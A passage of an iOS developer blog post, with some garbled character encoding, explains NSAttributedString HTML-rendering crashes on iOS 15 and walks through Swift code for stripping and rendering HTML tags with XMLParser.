so this issue has likely existed for a long time. However, the crash rate was nearly 100% in the early versions of iOS 15.Crash Reasons:&lt;compiler-generated&gt; line 2147483647 specialized @nonobjc NSAttributedString.init(data:options:documentAttributes:)NSAttributedString crashes during init with Crashed: com.apple.main-thread EXC_BREAKPOINT 0x00000001de9d4e44. It is also possible that the operation is not on the Main Thread.Reproduction Steps:When this issue suddenly appeared in large numbers, the development team was baffled; re-testing the points in the Crash Log showed no problems, and it was unclear under what conditions users encountered it. Until one time, by coincidence, I switched to ‚ÄúLow Power Mode‚Äù and the problem was triggered!! WTF!!!AnswerAfter some searching, I found many similar cases online and located the earliest identical crash issue question on the App Developer Forums, along with an official response: This is a known iOS Foundation bug: it has existed since iOS 12. To render complex HTML without usage restrictions: please use WKWebView Rendering Constraints: You may write your own HTML Parser &amp; Renderer Directly use Markdown as rendering constraints: iOS ‚â• 15 NSAttributedString can directly render text using Markdown format Rendering constraints mean limiting the rendering formats supported by the app, such as only supporting bold, italics, or hyperlinks.Supplement. Rendering Complex HTML ‚Äî Creating Text with Rich Visual EffectsCan coordinate an interface together with the backend:{ \"content\":[ {\"type\":\"text\",\"value\":\"Paragraph 1 plain text\"}, {\"type\":\"text\",\"value\":\"Paragraph 2 plain text\"}, {\"type\":\"text\",\"value\":\"Paragraph 3 plain text\"}, {\"type\":\"text\",\"value\":\"Paragraph 4 plain text\"}, {\"type\":\"image\",\"src\":\"https://zhgchg.li/logo.png\",\"title\":\"ZhgChgLi\"}, {\"type\":\"text\",\"value\":\"Paragraph 5 plain text\"} ]}Can be combined with Markdown to support text rendering, or refer to Medium‚Äôs approach:\"Paragraph\": { \"text\": \"code in text, and link in text, and ZhgChgLi, and bold, and I, only i\", \"markups\": [ { \"type\": \"CODE\", \"start\": 5, \"end\": 7 }, { \"start\": 18, \"end\": 22, \"href\": \"http://zhgchg.li\", \"type\": \"LINK\" }, { \"type\": \"STRONG\", \"start\": 50, \"end\": 63 }, { \"type\": \"EM\", \"start\": 55, \"end\": 69 } ]}The meaning of code in text, and link in text, and ZhgChgLi, and bold, and I, only i is:- Characters 5 to 7 should be marked as code (wrapped with `Text`)- Characters 18 to 22 should be marked as a link (using [Text](URL) format)- Characters 50 to 63 should be marked as bold (*Text*)- Characters 55 to 69 should be marked as italic (_Text_)With a standardized and describable structure, the app can render natively on its own, achieving optimal performance and user experience. Pitfalls of UITextView for Text Wrapping with Images, refer to my previous article: iOS UITextView Text Wrapping Editor (Swift)Why?Before providing a practical solution, let‚Äôs first return to the root of the problem. I personally believe the main cause of this issue does not come from Apple; the official bug is merely the trigger for the problem.The main issue comes from treating the App side as a Web for rendering. The advantage is fast web development, using the same API endpoint to deliver HTML regardless of client, and flexible rendering of any desired content. The drawbacks are that HTML is not a common interface for apps, app engineers are not expected to understand HTML, performance is very poor, rendering can only occur on the main thread, results are unpredictable during development, and supported specifications cannot be confirmed.Looking further up, the problem mostly lies in unclear original requirements, uncertainty about which specifications the app needs to support, and rushing that leads to using HTML directly as the interface between the app and the web.Very Poor PerformanceRegarding performance, actual tests show a 5 to 20 times speed difference between using NSAttributedString DocumentType.html directly and implementing rendering manually.BetterSince it is an app to be used, a better approach is to start with app development. For apps, the cost of adjusting requirements is much higher than for the web. Effective app development should be based on iterative adjustments with defined specifications. At the moment, it is necessary to confirm the supported specifications. If changes are needed later, we can schedule time to expand the specifications. Quick, on-the-fly changes are not feasible. This approach reduces communication costs and increases work efficiency. Confirming the scope of requirements Confirm supported specifications Confirm interface specifications (Markdown/BBCode/‚Ä¶ continuing with HTML is also fine, but if there are restrictions, such as only using &lt;b&gt;/&lt;i&gt;/&lt;a&gt;/&lt;u&gt;, it must be clearly communicated to developers in the code) Implementing a rendering engine yourself Maintenance and iteration support specifications [2023/02/27 Updated] [TL;DR]:Updated approach, no longer using XMLParser due to zero fault tolerance:&lt;br&gt; / &lt;Congratulation!&gt; / &lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/b&gt;Italic&lt;/i&gt;These three cases can cause XMLParser to fail and throw an error, resulting in a blank display.When using XMLParser, the HTML string must fully comply with XML rules and cannot tolerate errors like browsers or NSAttributedString.DocumentType.html, which can display content normally despite errors.Rewrite using pure Swift, parsing HTML tags with Regex and tokenizing them. Analyze and correct tag accuracy (fix missing end tags &amp; misplaced tags), then convert into an abstract syntax tree. Finally, use the Visitor Pattern to map HTML tags to abstract styles, producing the final NSAttributedString result; no parser libraries are used.‚Äî ‚ÄîHow?The die is cast. Back to the main topic, now that we are rendering NSAttributedString using HTML, how can we resolve the aforementioned crashes and performance issues?Inspired byStrip HTML Remove HTMLBefore discussing HTML Render, let‚Äôs first talk about Strip HTML. As mentioned earlier in the Why? section, where the app obtains HTML and what kind of HTML it receives should be clearly defined in the specifications; it should not be that the app might receive HTML and therefore needs to strip it. To quote a former supervisor: This is just too crazy, right?Option 1. NSAttributedStringlet data = \"&lt;div&gt;Text&lt;/div&gt;\".data(using: .unicode)!let attributed = try NSAttributedString(data: data, options: [.documentType: NSAttributedString.DocumentType.html, .characterEncoding: String.Encoding.utf8.rawValue], documentAttributes: nil)let string = attributed.string Using NSAttributedString to render HTML and then extracting the string will result in a clean String. The issues are the same as in this chapter: iOS 15 often crashes, has poor performance, and operations can only be done on the Main Thread. Option 2. RegexhtmlString = \"&lt;div&gt;Test&lt;/div&gt;\"htmlString.replacingOccurrences(of: \"&lt;[^&gt;]+&gt;\", with: \"\", options: .regularExpression, range: nil) The simplest and most effective way Regex cannot guarantee complete accuracy. For example, &lt;p foo=\"&gt;now what?\"&gt;Paragraph&lt;/p&gt; is valid HTML but will be stripped incorrectly. Option 3. XMLParserReferencing the approach of SwiftRichString, use XMLParser from Foundation to parse HTML as XML and implement your own HTML Parser &amp; Strip functionality.import UIKit// Ref: https://github.com/malcommac/SwiftRichStringfinal class HTMLStripper: NSObject, XMLParserDelegate { private static let topTag = \"source\" private var xmlParser: XMLParser private(set) var storedString: String // The XML parser sometimes splits strings, which can break localization-sensitive // string transforms. Work around this by using the currentString variable to // accumulate partial strings, and then reading them back out as a single string // when the current element ends, or when a new one is started. private var currentString: String? // MARK: - Initialization init(string: String) throws { let xmlString = HTMLStripper.escapeWithUnicodeEntities(string) let xml = \"&lt;\\(HTMLStripper.topTag)&gt;\\(xmlString)&lt;/\\(HTMLStripper.topTag)&gt;\" guard let data = xml.data(using: String.Encoding.utf8) else { throw XMLParserInitError(\"Unable to convert to UTF8\") } self.xmlParser = XMLParser(data: data) self.storedString = \"\" super.init() xmlParser.shouldProcessNamespaces = false xmlParser.shouldReportNamespacePrefixes = false xmlParser.shouldResolveExternalEntities = false xmlParser.delegate = self } /// Parse and generate attributed string. func parse() throws -&gt; String { guard xmlParser.parse() else { let line = xmlParser.lineNumber let shiftColumn = (line == 1) let shiftSize = HTMLStripper.topTag.lengthOfBytes(using: String.Encoding.utf8) + 2 let column = xmlParser.columnNumber - (shiftColumn ? shiftSize : 0) throw XMLParserError(parserError: xmlParser.parserError, line: line, column: column) } return storedString } // MARK: XMLParserDelegate @objc func parser(_ parser: XMLParser, didStartElement elementName: String, namespaceURI: String?, qualifiedName qName: String?, attributes attributeDict: [String: String]) { foundNewString() } @objc func parser(_ parser: XMLParser, didEndElement elementName: String, namespaceURI: String?, qualifiedName qName: String?) { foundNewString() } @objc func parser(_ parser: XMLParser, foundCharacters string: String) { currentString = (currentString ?? \"\").appending(string) } // MARK: Support Private Methods func foundNewString() { if let currentString = currentString { storedString.append(currentString) self.currentString = nil } } // handle html entity / html hex // Perform string escaping to replace all characters which are not supported by NSXMLParser // into the specified encoding with decimal entity. // For example, if your string contains '&amp;' character parser will break the style. // This option is active by default. // ref: https://github.com/malcommac/SwiftRichString/blob/e0b72d5c96968d7802856d2be096202c9798e8d1/Sources/SwiftRichString/Support/XMLStringBuilder.swift static func escapeWithUnicodeEntities(_ string: String) -&gt; String { guard let escapeAmpRegExp = try? NSRegularExpression(pattern: \"&amp;(?!(#[0-9]{2,4}\\|[A-z]{2,6});)\", options: NSRegularExpression.Options(rawValue: 0)) else { return string } let range = NSRange(location: 0, length: string.count) return escapeAmpRegExp.stringByReplacingMatches(in: string, options: NSRegularExpression.MatchingOptions(rawValue: 0), range: range, withTemplate: \"&amp;amp;\") }}let test = \"Êàë&lt;br/&gt;&lt;a href=\\\"http://google.com\\\"&gt;ÂêåÊÑè&lt;/a&gt;Êèê‰æõ&lt;b&gt;&lt;i&gt;ÂÄã&lt;/i&gt;‰∫∫&lt;/b&gt;Ë∫´ÂàÜË≠âÂ≠óËôüÔºèË≠∑ÁÖßÔºèÂ±ÖÁïô&lt;span style=\\\"color:#FF0000;font-size:20px;word-spacing:10px;line-height:10px\\\"&gt;Ë≠âËôüÁ¢º&lt;/span&gt;Ôºå‰ª•‰æõ&lt;i&gt;Ë∑®Â¢ÉÁâ©ÊµÅ&lt;/i&gt;ÊñπÈÄöÈóú&lt;span style=\\\"background-color:#00FF00;\\\"&gt;‰ΩøÁî®&lt;/span&gt;Ôºå‰∏¶Â∑≤&lt;img src=\\\"g.png\\\"/&gt;‰∫ÜËß£Ë∑®Â¢É&lt;br/&gt;ÂïÜÂìÅ‰πãÁâ©&lt;p&gt;ÊµÅÈúÄ&lt;/p&gt;Ê±Ç\"let stripper = try HTMLStripper(string: test)print(try! stripper.parse())// I agree to provide personal ID number / passport / residence permit number for cross-border logistics clearance use, and have understood the logistics requirements of cross-border goods.Using Foundation XML Parser to process a String, implement XMLParserDelegate with currentString to store the String. Since the String can be split into multiple parts, foundCharacters may be called repeatedly. Use didStartElement and didEndElement to detect the start and end of the string, save the current result, and then clear currentString. The advantage is that it also converts HTML Entities to actual characters, e.g. &amp;#103; -&gt; g The advantage is handling complexity, but XMLParser will fail if the HTML is non-compliant, e.g., &lt;br&gt; instead of &lt;br/&gt;. I personally believe that simply stripping HTML Option 2. is the better method. I introduce this method because rendering HTML uses the same principle, so this serves as a simple example :)HTML Render w/XMLParserUsing XMLParser to implement it ourselves, similar to the Strip principle, we can add specific rendering methods depending on which Tag is being parsed.Requirement Specifications: Support for additional tags to analyze Support setting Tag Default Style, e.g., applying link style to the &lt;a&gt; tag Support parsing the style attribute, as HTML explicitly specifies display style in style=\"color:red\" Style supports changing text weight, size, underline, line spacing, letter spacing, background color, and text color Does not support complex tags such as Image Tag, Table Tag, etc. Everyone can reduce features according to their own specifications. For example, if background color adjustment is not needed, then the option to set the background color does not need to be included. This article is just a conceptual implementation, not a Best Practice in architecture; if there are clear specifications and usage methods, consider applying some Design Patterns to achieve better maintainability and scalability.‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è Attention ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏èA reminder, if your app is brand new or can be fully converted to Markdown format, it is recommended to use the above method. Writing your own render in this article is too complex and won‚Äôt perform better than Markdown. Even if your iOS version is below 15 and does not support native Markdown, you can still find an excellent Markdown Parser solution on GitHub.HTMLTagParserprotocol HTMLTagParser { static var tag: String { get } // Declare the Tag Name to parse, e.g. a var storedHTMLAttributes: [String: String]? { get set } // Parsed attributes will be stored here, e.g. href, style var style: AttributedStringStyle? { get } // Style to apply for this Tag func render(attributedString: inout NSMutableAttributedString) // Implement the logic to render HTML to attributedString}Declare parsable HTML tag entities for easy extension and management.AttributedStringStyleprotocol AttributedStringStyle { var font: UIFont? { get set } var color: UIColor? { get set } var backgroundColor: UIColor? { get set } var wordSpacing: CGFloat? { get set } var paragraphStyle: NSParagraphStyle? { get set } var customs: [NSAttributedString.Key: Any]? { get set } // Universal setting port, it is recommended to abstract this after confirming supported specifications and close this port func render(attributedString: inout NSMutableAttributedString)}// abstract implementextension AttributedStringStyle { func render(attributedString: inout NSMutableAttributedString) { let range = NSMakeRange(0, attributedString.length) if let font = font { attributedString.addAttribute(NSAttributedString.Key.font, value: font, range: range) } if let color = color { attributedString.addAttribute(NSAttributedString.Key.foregroundColor, value: color, range: range) } if let backgroundColor = backgroundColor { attributedString.addAttribute(NSAttributedString.Key.backgroundColor, value: backgroundColor, range: range) } if let wordSpacing = wordSpacing { attributedString.addAttribute(NSAttributedString.Key.kern, value: wordSpacing as Any, range: range) } if let paragraphStyle = paragraphStyle { attributedString.addAttribute(NSAttributedString.Key.paragraphStyle, value: paragraphStyle, range: range) } if let customAttributes = customs { attributedString.addAttributes(customAttributes, range: range) } }}Declare styles available for setting tags.HTMLStyleAttributedParser// only support tag attributed down below// can set color, font size, line height, word spacing, background colorenum HTMLStyleAttributedParser: String { case color = \"color\" case fontSize = \"font-size\" case lineHeight = \"line-height\" case wordSpacing = \"word-spacing\" case backgroundColor = \"background-color\" func render(attributedString: inout NSMutableAttributedString, value: String) -&gt; Bool { let range = NSMakeRange(0, attributedString.length) switch self { case .color: if let color = convertToiOSColor(value) { attributedString.addAttribute(NSAttributedString.Key.foregroundColor, value: color, range: range) return true } case .backgroundColor: if let color = convertToiOSColor(value) { attributedString.addAttribute(NSAttributedString.Key.backgroundColor, value: color, range: range) return true } case .fontSize: if let size = convertToiOSSize(value) { attributedString.addAttribute(NSAttributedString.Key.font, value: UIFont.systemFont(ofSize: CGFloat(size)), range: range) return true } case .lineHeight: if let size = convertToiOSSize(value) { let paragraphStyle = NSMutableParagraphStyle() paragraphStyle.lineSpacing = size attributedString.addAttribute(NSAttributedString.Key.paragraphStyle, value: paragraphStyle, range: range) return true } case .wordSpacing: if let size = convertToiOSSize(value) { attributedString.addAttribute(NSAttributedString.Key.kern, value: size, range: range) return true } } return false } // convert 36px -&gt; 36 private func convertToiOSSize(_ string: String) -&gt; CGFloat? { guard let regex = try? NSRegularExpression(pattern: \"^([0-9]+)\"), let firstMatch = regex.firstMatch(in: string, options: [], range: NSRange(location: 0, length: string.utf16.count)), let range = Range(firstMatch.range, in: string), let size = Float(String(string[range])) else { return nil } return CGFloat(size) } // convert html hex color #ffffff to UIKit Color private func convertToiOSColor(_ hexString: String) -&gt; UIColor? { var cString: String = hexString.trimmingCharacters(in: .whitespacesAndNewlines).uppercased() if cString.hasPrefix(\"#\") { cString.remove(at: cString.startIndex) } if (cString.count) != 6 { return nil } var rgbValue: UInt64 = 0 Scanner(string: cString).scanHexInt64(&amp;rgbValue) return UIColor( red: CGFloat((rgbValue &amp; 0xFF0000) &gt;&gt; 16) / 255.0, green: CGFloat((rgbValue &amp; 0x00FF00) &gt;&gt; 8) / 255.0, blue: CGFloat(rgbValue &amp; 0x0000FF) / 255.0, alpha: CGFloat(1.0) ) }}Implement a Style Attributed Parser to parse style=\"color:red;font-size:16px\". Since CSS styles have many possible settings, you need to list the supported range.extension HTMLTagParser { func render(attributedString: inout NSMutableAttributedString) { defaultStyleRender(attributedString: &amp;attributedString) } func defaultStyleRender(attributedString: inout NSMutableAttributedString) { // setup default style to NSMutableAttributedString style?.render(attributedString: &amp;attributedString) // setup &amp; override HTML style (style=\"color:red;background-color:black\") to NSMutableAttributedString if it exists // any html tag can have style attribute if let style = storedHTMLAttributes?[\"style\"] { let styles = style.split(separator: \";\").map { $0.split(separator: \":\") }.filter { $0.count == 2 } for style in styles { let key = String(style[0]) let value = String(style[1]) if let styleAttributed = HTMLStyleAttributedParser(rawValue: key), styleAttributed.render(attributedString: &amp;attributedString, value: value) { print(\"Unsupported style attribute or value[\\(key):\\(value)]\") } } } }}Applying HTMLStyleAttributedParser &amp; Abstract Implementation of HTMLStyleAttributedParser.Some Implementation Examples of Tag Parser &amp; AttributedStringStylestruct LinkStyle: AttributedStringStyle { var font: UIFont? = UIFont.systemFont(ofSize: 14) var color: UIColor? = UIColor.blue var backgroundColor: UIColor? = nil var wordSpacing: CGFloat? = nil var paragraphStyle: NSParagraphStyle? var customs: [NSAttributedString.Key: Any]? = [.underlineStyle: NSUnderlineStyle.single.rawValue]}struct ATagParser: HTMLTagParser { // &lt;a&gt;&lt;/a&gt; static let tag: String = \"a\" var storedHTMLAttributes: [String: String]? = nil let style: AttributedStringStyle? = LinkStyle() func render(attributedString: inout NSMutableAttributedString) { defaultStyleRender(attributedString: &amp;attributedString) if let href = storedHTMLAttributes?[\"href\"], let url = URL(string: href) { let range = NSMakeRange(0, attributedString.length) attributedString.addAttribute(NSAttributedString.Key.link, value: url, range: range) } }}struct BoldStyle: AttributedStringStyle { var font: UIFont? = UIFont.systemFont(ofSize: 14, weight: .bold) var color: UIColor? = UIColor.black var backgroundColor: UIColor? = nil var wordSpacing: CGFloat? = nil var paragraphStyle: NSParagraphStyle? var customs: [NSAttributedString.Key: Any]? = [.underlineStyle: NSUnderlineStyle.single.rawValue]}struct BoldTagParser: HTMLTagParser { // &lt;b&gt;&lt;/b&gt; static let tag: String = \"b\" var storedHTMLAttributes: [String: String]? = nil let style: AttributedStringStyle? = BoldStyle()}HTMLToAttributedStringParser: Core Implementation of XMLParserDelegate// Ref: https://github.com/malcommac/SwiftRichStringfinal class HTMLToAttributedStringParser: NSObject { private static let topTag = \"source\" private var xmlParser: XMLParser? private(set) var attributedString: NSMutableAttributedString = NSMutableAttributedString() private(set) var supportedTagRenders: [HTMLTagParser] = [] private let defaultStyle: AttributedStringStyle /// Styles applied at each fragment. private var renderingTagRenders: [HTMLTagParser] = [] // The XML parser sometimes splits strings, which can break localization-sensitive // string transforms. Work around this by using the currentString variable to // accumulate partial strings, and then reading them back out as a single string // when the current element ends, or when a new one is started. private var currentString: String? // MARK: - Initialization init(defaultStyle: AttributedStringStyle) { self.defaultStyle = defaultStyle super.init() } func register(_ tagRender: HTMLTagParser) { if let index = supportedTagRenders.firstIndex(where: { type(of: $0).tag == type(of: tagRender).tag }) { supportedTagRenders.remove(at: index) } supportedTagRenders.append(tagRender) } /// Parse and generate attributed string. func parse(string: String) throws -&gt; NSAttributedString { var xmlString = HTMLToAttributedStringParser.escapeWithUnicodeEntities(string) // make sure &lt;br/&gt; format is correct XML // because Web may use &lt;br&gt; to present &lt;br/&gt;, but &lt;br&gt; is not a valid XML xmlString = xmlString.replacingOccurrences(of: \"&lt;br&gt;\", with: \"&lt;br/&gt;\") let xml = \"&lt;\\(HTMLToAttributedStringParser.topTag)&gt;\\(xmlString)&lt;/\\(HTMLToAttributedStringParser.topTag)&gt;\" guard let data = xml.data(using: String.Encoding.utf8) else { throw XMLParserInitError(\"Unable to convert to UTF8\") } let xmlParser = XMLParser(data: data) xmlParser.shouldProcessNamespaces = false xmlParser.shouldReportNamespacePrefixes = false xmlParser.shouldResolveExternalEntities = false xmlParser.delegate = self self.xmlParser = xmlParser attributedString = NSMutableAttributedString() guard xmlParser.parse() else { let line = xmlParser.lineNumber let shiftColumn = (line == 1) let shiftSize = HTMLToAttributedStringParser.topTag.lengthOfBytes(using: String.Encoding.utf8) + 2 let column = xmlParser.columnNumber - (shiftColumn ? shiftSize : 0) throw XMLParserError(parserError: xmlParser.parserError, line: line, column: column) } return attributedString }}// MARK: Private Methodprivate extension HTMLToAttributedStringParser { func enter(element elementName: String, attributes: [String: String]) { // elementName = tagName, EX: a,span,div... guard elementName != HTMLToAttributedStringParser.topTag else { return } if let index = supportedTagRenders.firstIndex(where: { type(of: $0).tag == elementName }) { var tagRender = supportedTagRenders[index] tagRender.storedHTMLAttributes = attributes renderingTagRenders.append(tagRender) } } func exit(element elementName: String) { if !renderingTagRenders.isEmpty { renderingTagRenders.removeLast() } } func foundNewString() { if let currentString = currentString { // currentString != nil ,ex: &lt;i&gt;currentString&lt;/i&gt; var newAttributedString = NSMutableAttributedString(string: currentString) if !renderingTagRenders.isEmpty { for (key, tagRender) in renderingTagRenders.enumerated() { // Render Style tagRender.render(attributedString: &amp;newAttributedString) renderingTagRenders[key].storedHTMLAttributes = nil } } else { defaultStyle.render(attributedString: &amp;newAttributedString) } attributedString.append(newAttributedString) self.currentString = nil } else { // currentString == nil ,ex: &lt;br/&gt; var newAttributedString = NSMutableAttributedString() for (key, tagRender) in renderingTagRenders.enumerated() { // Render Style tagRender.render(attributedString: &amp;newAttributedString) renderingTagRenders[key].storedHTMLAttributes = nil } attributedString.append(newAttributedString) } }}// MARK: Helperextension HTMLToAttributedStringParser { // handle html entity / html hex // Perform string escaping to replace all characters which are not supported by NSXMLParser // into the specified encoding with decimal entity. // For example if your string contains '&amp;' character parser will break the style. // This option is active by default. // ref: https://github.com/malcommac/SwiftRichString/blob/e0b72d5c96968d7802856d2be096202c9798e8d1/Sources/SwiftRichString/Support/XMLStringBuilder.swift static func escapeWithUnicodeEntities(_ string: String) -&gt; String { guard let escapeAmpRegExp = try? NSRegularExpression(pattern: \"&amp;(?!(#[0-9]{2,4}\\|[A-z]{2,6});)\", options: NSRegularExpression.Options(rawValue: 0)) else { return string } let range = NSRange(location: 0, length: string.count) return escapeAmpRegExp.stringByReplacingMatches(in: string, options: NSRegularExpression.MatchingOptions(rawValue: 0), range: range, withTemplate: \"&amp;amp;\") }}// MARK: XMLParserDelegateextension HTMLToAttributedStringParser: XMLParserDelegate { func parser(_ parser: XMLParser, didStartElement elementName: String, namespaceURI: String?, qualifiedName qName: String?, attributes attributeDict: [String: String]) { foundNewString() enter(element: elementName, attributes: attributeDict) } func parser(_ parser: XMLParser, didEndElement elementName: String, namespaceURI: String?, qualifiedName qName: String?) { foundNewString() guard elementName != HTMLToAttributedStringParser.topTag else { return } exit(element: elementName) } func parser(_ parser: XMLParser, foundCharacters string: String) { currentString = (currentString ?? \"\").appending(string) }}Applying the logic of Strip, we can combine the parsed structure by using elementName to identify the current Tag, then apply the corresponding Tag Parser and the predefined Style.Test Resultlet test = \"I&lt;br/&gt;&lt;a href=\\\"http://google.com\\\"&gt;agree&lt;/a&gt; to provide &lt;b&gt;&lt;i&gt;personal&lt;/i&gt;&lt;/b&gt; ID card number/passport/residence &lt;span style=\\\"color:#FF0000;font-size:20px;word-spacing:10px;line-height:10px\\\"&gt;certificate number&lt;/span&gt; for &lt;i&gt;cross-border logistics&lt;/i&gt; clearance &lt;span style=\\\"background-color:#00FF00;\\\"&gt;use&lt;/span&gt;, and have &lt;img src=\\\"g.png\\\"/&gt;understood the cross-border&lt;br/&gt;product &lt;p&gt;logistics requirements&lt;/p&gt;\"let render = HTMLToAttributedStringParser(defaultStyle: DefaultTextStyle())render.register(ATagParser())render.register(BoldTagParser())render.register(SpanTagParser())//...print(try! render.parse(string: test))// Result:// I{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }agree{// NSColor = \"UIExtendedSRGBColorSpace 0 0 1 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSLink = \"http://google.com\";// NSUnderline = 1;// }to provide{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }personal{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Bold 14.00 pt. P [] (0x13a013870) fobj=0x13a013870, spc=3.46\\\"\";// NSUnderline = 1;// }ID card number/passport/residence{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }certificate number{// NSColor = \"UIExtendedSRGBColorSpace 1 0 0 1\";// NSFont = \"\\\".SFNS-Regular 20.00 pt. P [] (0x13a015fa0) fobj=0x13a015fa0, spc=4.82\\\"\";// NSKern = 10;// NSParagraphStyle = \"Alignment 4, LineSpacing 10, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }, for cross-border logistics clearance{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }use{// NSBackgroundColor = \"UIExtendedSRGBColorSpace 0 1 0 1\";// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }, and have understood the cross-border product logistics requirements{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }Display Result:Done!This completes our implementation of HTML rendering using XMLParser, maintaining extensibility and specifications. We can manage and understand the supported string rendering types in the app through the code.Complete Github Repo as follows This article is simultaneously published on my personal blog: [Click here]. If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Convert Medium Posts to MarkdownÔΩúEffortless Backup & Formatting Tool", "url": "/posts/zrealm-dev/convert-medium-posts-to-markdown-effortless-backup-formatting-tool-ddd88a84e177/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, medium, markdown, backup, ruby, automation", "date": "2022-05-28 15:04:35 +0800", "snippet": " 